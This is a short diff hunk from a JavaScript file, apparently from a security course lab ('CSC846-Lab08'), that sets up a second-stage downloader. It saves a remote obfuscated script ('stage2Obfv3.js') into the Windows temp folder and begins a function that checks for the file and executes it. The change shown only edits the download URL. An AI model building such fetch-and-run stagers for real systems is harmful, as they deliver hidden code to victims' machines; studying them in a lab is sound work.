@@ -5,7 +5,7 @@ var fso = new ActiveXObject("Scripting.FileSystemObject");
 var tempFolder = fso.GetSpecialFolder(2);
 
 const filePath = path.join(tempFolder, 'stage2Obfv3.js'); // Path to save the file
-const scriptUrl = 'https://raw.githubusercontent.com/kwafula/kwafula.github.io/refs/heads/main/CSC846-Lab08/stage2Obfv3.js'; // URL of the script to download
+const scriptUrl = 'https://raw.githubusercontent.com/kwafula/kwafula.github.io/refs/heads/main/CSC846-Lab08/stage2Obfv3'; // URL of the script to download
 
 async function checkAndExecuteScript() {
     if (fs.existsSync(filePath)) {
